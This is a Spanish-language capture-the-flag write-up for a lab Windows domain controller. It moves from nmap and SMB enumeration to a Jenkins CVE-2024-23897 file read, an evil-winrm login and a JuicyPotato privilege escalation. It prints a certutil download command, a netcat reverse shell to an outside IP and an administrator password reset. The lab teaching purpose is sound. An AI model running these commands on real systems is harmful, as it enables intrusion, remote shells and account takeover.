
-------
- Tags: #smb #msfv #evilwinrm #metasploit #jenkins #AD
---------

# Nmap scan


```bash
# Nmap 7.94SVN scan initiated Tue Sep 24 01:47:47 2024 as: nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49667,49669,49670,49672,49675,49689,49711 -sCV -vvv -oN targeted 192.168.200.4
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Nmap scan report for 192.168.200.4 (192.168.200.4)
Host is up, received arp-response (0.00029s latency).
Scanned at 2024-09-24 01:47:47 CST for 68s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 128 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2024-09-23 23:47:52Z)
135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: chimichurri.thl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 128
464/tcp   open  kpasswd5?     syn-ack ttl 128
593/tcp   open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 128
3268/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: chimichurri.thl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 128
5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6969/tcp  open  http          syn-ack ttl 128 Jetty 10.0.11
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Panel de control [Jenkins]
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
|_http-server-header: Jetty(10.0.11)
9389/tcp  open  mc-nmf        syn-ack ttl 128 .NET Message Framing
47001/tcp open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49689/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49711/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 08:00:27:5D:D8:7A (Oracle VirtualBox virtual NIC)
Service Info: Host: CHIMICHURRI; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 41972/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 49572/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 29783/udp): CLEAN (Timeout)
|   Check 4 (port 64410/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-09-23T23:48:46
|_  start_date: 2024-09-23T23:26:21
| nbstat: NetBIOS name: CHIMICHURRI, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:5d:d8:7a (Oracle VirtualBox virtual NIC)
| Names:
|   CHIMICHURRI0<00>     Flags: <group><active>
|   CHIMICHURRI<00>      Flags: <unique><active>
|   CHIMICHURRI0<1c>     Flags: <group><active>
|   CHIMICHURRI<20>      Flags: <unique><active>
|   CHIMICHURRI0<1b>     Flags: <unique><active>
| Statistics:
|   08:00:27:5d:d8:7a:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: -8h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 24 01:48:55 2024 -- 1 IP address (1 host up) scanned in 67.96 seconds

```


-----

## Se empieza enumerando puerto 445 SMB

```bash
crackmapexec smb 192.168.200.4

crackmapexec smb 192.168.200.4 --shares   
```

```bash
smbmap -H 192.168.200.4 -u "null" 
smbmap -H 192.168.200.4 -u "guest" 
smbmap -H 192.168.200.4 -u "invitado" 
```

```bash
//Listar Recursos
smbclient -L 192.168.200.4 -N 

//Una vez vemos algun recurso interesante
smbclient //192.168.200.4/drogas -N 

//Credenciales.txt
```

----------
#### RPC

*Como vemos servicio RPC tramos de conectarnos igual con un NullSession*
```bash
rpcclient -U "" 192.168.200.4 -N 
//Not Working
```

-----------------
## Explotacion de Jenkins <= 2.441 Con uso del CVE-2024-23897

-  [Github Exploit](https://github.com/Maalfer/CVE-2024-23897)

- El script nos permite leer archivos locales de la maquina de la siguiente forma:
```bash
// Usage
python3 CVE-2024-23897.py <IpVictim> <Port> <FILE>

//Ejemplo
python3 CVE-2024-23897.py 192.168.200.4 6969 /\Users/\hacker/\Desktop/\perico.txt
```

---
## Una vez tenemos las credenciales, podemos acceder teniendo en cuneta que esta el WinRM

- Haciendo uso del **EVIL- WINRM**
```bash
evil-winrm -i 192.168.200.4 -u hacker -p Perico69
// y pa dentro!
```


---
# PRIVESC

- Dentro tenemos activado el perimiso **SeImpersonatePrivilege**, el cual es vulnerable al exploit conocido como **JuicyPotato**
- [Github](https://github.com/ohpe/juicy-potato/releases)

- Nos transferimos el binario con **evil-winrm** usando el comando **upload**
- En caso de no tener sesion con **evil-winrm**, podemos tranferir los archivos o binario usando **certutil** de la siguiente forma:
```bash
//En maquina local 
python3 -m http.server 80

//Windows victima
certutil.exe -urlcache -f http://<localIP>/file_name FileOutput.exe

//Revshell
.\JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t

//Si no funciona probar transifiriendo binario de netcat, y mandar la Revshell con NC
```

-------------
## Extra

- En esta parte somos el **NT Authority System**, pero no podemos leer las flags, ya que solo el user *Administrador* es el que tiene permisos de lectura. Lo que haremos es cambiarle la contrasena a este usuario y volvernos a conectar con WinRM de la siguiente forma:

```bash
net user Administrador contra123!
```

```bash
evil-winrm -i 192.168.200.4 -u Administrador -p 'contra123!'
```

##### PWNED!


